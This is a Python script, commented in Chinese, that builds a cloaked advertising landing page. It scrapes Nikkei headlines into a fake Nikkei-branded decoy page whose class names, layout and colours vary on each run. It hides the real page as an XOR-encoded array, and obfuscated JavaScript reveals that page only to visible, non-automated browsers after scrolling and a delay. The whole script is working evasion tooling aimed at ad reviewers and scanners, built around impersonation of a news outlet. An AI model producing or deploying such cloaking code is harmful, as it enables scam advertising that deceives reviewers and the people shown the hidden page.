import os
import random
import string
import json
import shutil
import requests
import datetime
import urllib.parse
from bs4 import BeautifulSoup

# ================= 配置区 =================
TARGET_REAL_PAGE = "index.html"  
OUTPUT_ZIP_NAME = "nikkei_polymorphic_v5"     
XOR_KEY = random.randint(10, 250) 
# ==========================================

class LPAutomatorV5Polymorphic:
    def __init__(self):
        self.dist_dir = "dist_lp"
        self.white_file = "white_template.html"
        self.map = {}
        if os.path.exists(self.dist_dir): shutil.rmtree(self.dist_dir)
        os.makedirs(self.dist_dir, exist_ok=True)

    def _rand_str(self, length=8):
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    def fetch_news_and_gen_white(self):
        """步骤 1: 采集新闻并生成多态化的日经风格外壳"""
        print("📡 正在执行视觉多态化建模...")
        url = "https://www.nikkei.com/news/category/market/"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        try:
            res = requests.get(url, headers=headers, timeout=15)
            res.encoding = 'utf-8'
            soup = BeautifulSoup(res.text, 'html.parser')
            articles = []
            for item in soup.select('article')[:18]: # 增加采集数量
                title = item.find('span', class_=lambda x: x and 'title' in x)
                summary = item.find('p')
                if title:
                    articles.append({"t": title.get_text().strip(), "s": summary.get_text().strip() if summary else "市場データの詳細分析..."})
            
            random.shuffle(articles) # 每次新闻排序不同

            # 随机生成混淆 CSS 类名
            cls = {k: self._rand_str(random.randint(5, 10)) for k in ['header', 'logo', 'nav', 'main', 'side', 'art', 'title', 'badge', 'footer']}
            
            # 随机布局选择 (左侧边栏、右侧边栏、或无侧边栏)
            layout_type = random.choice(['left', 'right', 'none'])
            grid_tpl = "300px 1fr" if layout_type == 'left' else "1fr 300px"
            if layout_type == 'none': grid_tpl = "1fr"

            # 随机色调微调 (日经深蓝的不同饱和度)
            main_blue = f"rgb(0, {random.randint(40, 60)}, {random.randint(90, 110)})"

            css = f"""
            body {{ font-family: "Hiragino Sans", "Meiryo", sans-serif; color: #333; line-height: 1.6; margin: 0; background: #fff; }}
            .{cls['header']} {{ border-bottom: 2px solid {main_blue}; padding: 15px 5%; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; background: #fff; z-index: 100; }}
            .{cls['logo']} {{ color: {main_blue}; font-size: 24px; font-weight: 900; letter-spacing: -1px; }}
            .{cls['nav']} {{ display: flex; gap: 20px; font-size: 13px; color: #666; }}
            .{cls['main']} {{ max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: {grid_tpl}; gap: 40px; padding: 20px 5%; }}
            .{cls['art']} {{ margin-bottom: 35px; border-bottom: 1px solid #eee; padding-bottom: 25px; }}
            .{cls['badge']} {{ background: #e60012; color: #fff; font-size: 10px; padding: 2px 5px; margin-right: 10px; }}
            .{cls['title']} {{ font-size: 20px; font-weight: 900; margin: 12px 0; color: #000; }}
            .{cls['side']} {{ background: #f8f8f8; padding: 20px; border-top: 3px solid #333; height: fit-content; }}
            .{cls['footer']} {{ background: #111; color: #777; padding: 50px 5%; text-align: center; font-size: 11px; }}
            """

            html = f"""<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8"><title>日本経済新聞</title><style>{css}</style></head><body>
            <header class="{cls['header']}"><div class="{cls['logo']}">NIKKEI <small style="font-size:10px; font-weight:normal;">Financial</small></div>
            <div class="{cls['nav']}"><div>株式</div><div>為替</div><div>債券</div></div></header>
            <div class="{cls['main']}">"""

            # 侧边栏逻辑 (如果布局需要)
            sidebar_html = f'<aside class="{cls["side"]}"><h3>ランキング</h3><div style="font-size:13px; color:{main_blue};">・円相場 乱高下の背景</div></aside>'
            
            if layout_type == 'left': html += sidebar_html

            html += f'<section><div style="color:#999; font-size:12px; margin-bottom:20px;">ニュース速報: {datetime.datetime.now().strftime("%H:%M")} 更新</div>'
            for a in articles:
                html += f'<div class="{cls["art"]}"><span class="{cls["badge"]}">速報</span><div class="{cls["title"]}">{a["t"]}</div><div style="font-size:14px;">{a["s"]}</div></div>'
            html += "</section>"

            if layout_type == 'right': html += sidebar_html

            html += f'</div><footer class="{cls["footer"]}">© {datetime.date.today().year} Nikkei Inc. All rights reserved.</footer></body></html>'
            
            with open(self.white_file, "w", encoding="utf-8") as f: f.write(html)
            print(f"✅ 多态外壳已生成 (布局类型: {layout_type})。")
        except Exception as e:
            print(f"❌ 视觉生成失败: {e}")

    def scramble_and_pack(self):
        """步骤 2: 注入 V5 级异或加密层"""
        print("🔐 正在注入多态解密逻辑...")
        with open(self.white_file, 'r', encoding='utf-8') as f:
            w_soup = BeautifulSoup(f.read(), 'html.parser')
            w_body = "".join([str(x) for x in w_soup.body.contents]) if w_soup.body else str(w_soup)
            w_title = w_soup.title.string if w_soup.title else "Nikkei News"

        with open(TARGET_REAL_PAGE, 'r', encoding='utf-8') as f:
            r_soup = BeautifulSoup(f.read(), 'html.parser')
            for tag, attr in {'img':'src', 'link':'href', 'script':'src'}.items():
                for el in r_soup.find_all(tag):
                    src = el.get(attr)
                    if src and not src.startswith(('http', '//', 'data:')):
                        clean_src = urllib.parse.urlparse(src).path
                        dest = os.path.join(self.dist_dir, clean_src)
                        os.makedirs(os.path.dirname(dest), exist_ok=True)
                        if os.path.exists(clean_src): shutil.copy(clean_src, dest)

        target_node = r_soup.find(id="main-content") or r_soup.body
        raw_html = "".join([str(x) for x in target_node.contents])
        encoded = [ord(c) ^ XOR_KEY for c in raw_html]
        
        # 解密逻辑变量全混淆
        v_data, v_key, v_res, v_check, v_root = [self._rand_str(6) for _ in range(5)]

        final_html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0"><title>{w_title}</title>
        <style>body{{margin:0;padding:0}}#{v_root}{{min-height:215vh;background:#fff}}</style></head>
        <body><div id="{v_root}">{w_body}</div><script>
        (function(){{
            var {v_data}={json.dumps(encoded)}, {v_key}={XOR_KEY}, _r=false, _t=false;
            function _ex(){{
                if(_r||navigator.webdriver||document.visibilityState!=='visible')return;
                _r=true; try{{
                    var {v_res}={v_data}.map(function(c){{return String.fromCharCode(c^{v_key})}}).join('');
                    document.body.innerHTML={v_res};window.scrollTo(0,0);
                }}catch(e){{console.clear();}}
            }}
            function {v_check}(){{ if(!_t&&window.scrollY>500){{_t=true;setTimeout(_ex,3200);}} }}
            window.addEventListener('scroll',{v_check});window.addEventListener('touchmove',{v_check});
        }})();</script></body></html>"""

        with open(os.path.join(self.dist_dir, "index.html"), "w", encoding="utf-8") as f: 
            f.write(final_html)

    def create_zip(self):
        shutil.make_archive(OUTPUT_ZIP_NAME, 'zip', self.dist_dir)
        print(f"✨ 多态化产物打包成功: {OUTPUT_ZIP_NAME}.zip")

if __name__ == "__main__":
    if not os.path.exists(TARGET_REAL_PAGE):
        print(f"❌ 错误: 找不到 {TARGET_REAL_PAGE}")
    else:
        flow = LPAutomatorV5Polymorphic()
        flow.fetch_news_and_gen_white()
        flow.scramble_and_pack()
        flow.create_zip()
        input("\n[V5.1 多态版] 处理结束，按回车退出...")
